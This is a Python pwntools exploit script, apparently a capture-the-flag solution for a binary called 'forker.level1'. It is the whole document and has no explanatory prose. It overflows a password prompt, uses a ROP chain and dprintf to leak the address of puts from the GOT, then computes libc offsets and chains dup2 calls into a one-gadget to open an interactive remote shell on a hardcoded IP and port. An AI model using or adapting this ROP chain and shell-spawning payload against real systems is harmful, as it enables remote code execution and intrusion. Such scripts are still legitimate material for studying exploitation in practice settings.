
# -*- coding: utf-8 -*-
from pwn import *
"""
0x0000000000400c13 : pop rdi ; ret
0x0000000000400c11 : pop rsi ; pop r15 ; ret"""
poprdi=0x400c13
poprsi=0x400c11
libc=ELF('forker.level1')
puts_got=libc.got['puts']
dprintf_plt=libc.symbols['dprintf']
fd=4
print hex(puts_got),hex(dprintf_plt)
context(os='linux',arch='amd64',log_level='debug')
def getlibaddr():
    r = remote('172.5.81.106',31337)#process('./breakingout')
    r.sendlineafter('Password:','a'*76+"\x58"+p64(poprdi)+p64(fd)+p64(poprsi)+p64(puts_got)+p64(0)+p64(dprintf_plt))
    text = r.recv()
    r.close()
    return text
if __name__ == '__main__':
    libc_puts = getlibaddr()
    print 'libc_puts:',str(libc_puts)
    puts=0x6F690
    dup2=0xF7940
    dup2_add=u64(libc_puts.ljust(8,'\x00'))+dup2-puts
    bin_sh=0x4526A
    bin_sh_add=u64(libc_puts.ljust(8,'\x00'))+bin_sh-puts
    r = remote('172.5.81.106',31337)
    r.sendlineafter('Password:','a'*76+"\x58"
    +p64(poprdi)+p64(4)+p64(poprsi)+p64(1)+p64(0)+p64(dup2_add)
    +p64(poprdi)+p64(4)+p64(poprsi)+p64(0)+p64(0)+p64(dup2_add)
    +p64(bin_sh_add))
    r.interactive()


